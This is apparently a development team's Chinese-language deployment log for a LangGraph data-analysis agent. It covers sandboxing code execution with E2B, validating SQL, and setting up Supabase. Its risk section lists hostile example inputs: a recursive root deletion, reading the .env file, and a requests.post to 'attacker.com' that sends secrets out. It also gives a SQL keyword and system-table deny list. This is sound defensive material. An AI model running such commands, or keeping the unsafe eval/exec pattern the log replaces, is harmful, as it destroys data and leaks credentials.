# Data Agent 部署上线日志

本文档记录 Data Agent 从本地开发环境部署到公网的全过程。

---

## 项目背景

Data Agent 是一个基于 LangGraph 的智能数据分析助手，具备以下能力：
- PostgreSQL 数据库查询
- Python 代码执行与数据分析
- matplotlib/seaborn 可视化图表生成
- Tavily 网络搜索

**目标**：将项目部署到公网，让外部用户可以安全使用。

---

## 部署计划概览

| 阶段 | 任务 | 状态 |
|------|------|------|
| 第一阶段 | 安全加固（E2B 沙盒集成） | ✅ 完成 |
| 第二阶段 | 云数据库迁移（Supabase） | ✅ 完成 |
| 第三阶段 | 后端部署（LangGraph Cloud） | ⏳ 待开始 |
| 第四阶段 | 前端开发（Next.js） | ⏳ 待开始 |
| 第五阶段 | 部署上线（Vercel） | ⏳ 待开始 |
| 第六阶段 | 测试与优化 | ⏳ 待开始 |

---

## 第一阶段：安全加固

### 1.1 背景与问题

当前 `graph.py` 中的 `python_inter` 和 `fig_inter` 工具直接使用 `eval()` 和 `exec()` 执行用户代码，存在严重安全风险：

```python
# 原有代码（不安全）
def python_inter(py_code: str) -> str:
    g = globals()
    try:
        return str(eval(py_code, g))  # 危险！可执行任意代码
    except:
        exec(py_code, g)  # 危险！无任何限制
```

**风险示例**：
- `os.system('rm -rf /')` - 删除系统文件
- `open('.env').read()` - 读取敏感配置
- `requests.post('attacker.com', data=secrets)` - 数据外泄

详细风险分析见 `SECURITY_GUIDE.md`。

### 1.2 解决方案：E2B 沙盒

E2B (https://e2b.dev) 提供云端隔离的代码执行环境：

**优势**：
- 完全隔离的云端沙盒，与主机系统隔离
- 预装数据科学常用库（pandas、numpy、matplotlib 等）
- 内置超时和资源限制
- 支持文件上传/下载
- 无需自建 Docker 基础设施

**工作原理**：
```
用户代码 → LangGraph Agent → E2B API → 云端沙盒执行 → 返回结果
```

### 1.3 修改内容

**修改文件**：`graph.py`

**修改范围**：
1. `python_inter` 函数 - 使用 E2B 沙盒执行 Python 代码
2. `fig_inter` 函数 - 使用 E2B 沙盒执行绘图代码，下载生成的图片

**环境变量**：
```env
# .env 中添加
E2B_API_KEY=your_e2b_api_key
```

### 1.4 修改前后对比

| 方面 | 修改前 | 修改后 |
|------|--------|--------|
| 执行环境 | 本地进程（不安全） | E2B 云端沙盒（隔离） |
| 文件访问 | 可访问本地所有文件 | 仅沙盒内文件 |
| 网络访问 | 可访问任意网络 | 沙盒内受限 |
| 系统命令 | 可执行任意命令 | 无法影响主机 |
| 资源限制 | 无 | E2B 内置限制 |

### 1.5 注意事项

1. **E2B 沙盒生命周期**：默认 5 分钟，每次调用创建新沙盒
2. **数据持久化**：沙盒销毁后数据丢失，需要的数据应及时返回
3. **图片处理**：绘图后需从沙盒下载图片到本地保存
4. **API 成本**：E2B 按使用时间计费，免费额度 100 小时/月

---

## 修改记录

### 2026-01-04：集成 E2B 沙盒

- [x] 修改 `python_inter` 使用 E2B 执行代码
- [x] 修改 `fig_inter` 使用 E2B 执行绘图代码
- [x] 添加图片从沙盒下载到本地的逻辑
- [x] 更新 `requirements.txt` 添加 `e2b-code-interpreter`
- [x] 创建本部署日志文档
- [x] `.env` 已配置 `E2B_API_KEY`

**状态**：✅ 完成，待测试

---

### 2026-01-04：添加 SQL 安全验证

**背景**：
- `sql_inter` 和 `extract_data` 直接执行用户 SQL，存在注入风险
- 恶意用户可能执行 DROP、DELETE 等破坏性操作
- 可能访问系统表获取敏感信息

**解决方案**：双重防护
1. **代码层验证**：使用 `sqlparse` 解析 SQL，检查语句类型和危险关键字
2. **数据库层防护**：使用只读用户连接（需在 Supabase 配置）

**修改内容**：
- [x] 新增 `validate_sql()` 函数
- [x] `sql_inter` 添加 SQL 验证
- [x] `extract_data` 添加 SQL 验证
- [x] 更新 `requirements.txt` 添加 `sqlparse`
- [x] 改进错误处理

**验证规则**：
- 仅允许 SELECT 语句
- 禁止关键字：DROP, DELETE, TRUNCATE, ALTER, CREATE, INSERT, UPDATE, GRANT, REVOKE, EXECUTE, COPY, VACUUM, REINDEX, CLUSTER
- 禁止访问系统表：pg_shadow, pg_roles, pg_authid, information_schema

**状态**：✅ 完成，待测试

---

### 2026-01-04：Supabase 云数据库迁移

**配置信息**：
- Host: `aws-1-ap-northeast-2.pooler.supabase.com` (Connection Pooler)
- Port: `6543` (Pooler 端口)
- User: `agent_reader.khoqxgnmngysizvwtqlh`
- Database: `postgres`
- Pool Mode: `transaction`

**已完成**：
- [x] 在 Supabase 创建用户 `agent_reader`
- [x] 创建 schema: `business_data` (业务数据), `agent_memory` (Agent 记忆)
- [x] 创建表: `business_data.students_scores`
- [x] 配置权限: `agent_reader` 只能 SELECT `business_data` schema
- [x] 更新 `.env` 连接配置
- [x] 更新 `graph.py` prompt，添加 schema 前缀说明

**状态**：✅ 完成，待测试

---

## 第二阶段：云数据库迁移（Supabase）

### 2.1 数据架构设计

```
Supabase 数据库
├── business schema（业务数据）
│   ├── students_scores
│   ├── stock_data
│   └── ...
│   └── 权限：agent_readonly 只读
│
└── public schema（用户数据）
    ├── conversations（对话记录）
    ├── messages（消息）
    └── usage_credits（使用额度）
    └── 权限：Supabase Auth + RLS
```

### 2.2 Supabase 配置步骤

#### 步骤 1：在 SQL Editor 执行以下脚本

```sql
-- ============================================================
-- 1. 创建业务数据 Schema
-- ============================================================
CREATE SCHEMA IF NOT EXISTS business;

-- 示例表（根据实际需求修改）
CREATE TABLE business.students_scores (
    id SERIAL PRIMARY KEY,
    name VARCHAR(50),
    subject VARCHAR(50),
    score INTEGER,
    created_at TIMESTAMP DEFAULT NOW()
);

-- ============================================================
-- 2. 授予只读权限
-- ============================================================
GRANT USAGE ON SCHEMA business TO postgres;
GRANT SELECT ON ALL TABLES IN SCHEMA business TO postgres;
ALTER DEFAULT PRIVILEGES IN SCHEMA business GRANT SELECT ON TABLES TO postgres;

-- ============================================================
-- 3. 用户数据表
-- ============================================================
CREATE TABLE IF NOT EXISTS public.conversations (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id),
    title TEXT,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS public.messages (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    conversation_id UUID REFERENCES public.conversations(id) ON DELETE CASCADE,
    role TEXT CHECK (role IN ('user', 'assistant')),
    content TEXT,
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS public.usage_credits (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES auth.users(id) UNIQUE,
    credits_remaining INTEGER DEFAULT 100,
    last_reset TIMESTAMP DEFAULT NOW()
);

-- 启用 RLS
ALTER TABLE public.conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.usage_credits ENABLE ROW LEVEL SECURITY;

-- RLS 策略
CREATE POLICY "Users can manage own conversations" ON public.conversations
    FOR ALL USING (auth.uid() = user_id);

CREATE POLICY "Users can manage own messages" ON public.messages
    FOR ALL USING (
        conversation_id IN (
            SELECT id FROM public.conversations WHERE user_id = auth.uid()
        )
    );

CREATE POLICY "Users can view own credits" ON public.usage_credits
    FOR ALL USING (auth.uid() = user_id);
```

#### 步骤 2：更新 .env 配置

```env
# Supabase 配置
PG_HOST=db.xxxxxxxxxxxx.supabase.co
PG_PORT=5432
PG_USER=postgres
PG_PASSWORD=your-supabase-password
PG_DBNAME=postgres
```

#### 步骤 3：迁移本地数据

```bash
# 1. 导出本地数据
pg_dump -h localhost -U financial-news-brief -d data_agent \
  -t students_scores --data-only > local_data.sql

# 2. 导入到 Supabase
psql "postgresql://postgres:密码@db.xxx.supabase.co:5432/postgres" < local_data.sql
```

### 2.3 数据同步策略

**业务数据（你维护）**：
- 本地开发和测试
- 确认后导出并上传到 Supabase
- 建议使用 Git 管理 SQL 脚本

**用户数据（自动管理）**：
- Supabase 自动处理
- 定期备份到本地

```bash
# 备份用户数据
pg_dump "postgresql://postgres:密码@db.xxx.supabase.co:5432/postgres" \
  -t public.conversations -t public.messages -t public.usage_credits \
  --data-only > user_backup_$(date +%Y%m%d).sql
```

**状态**：⏳ 待配置

---

**文档版本**：1.0  
**最后更新**：2026-01-04  
**作者**：Data Agent 团队
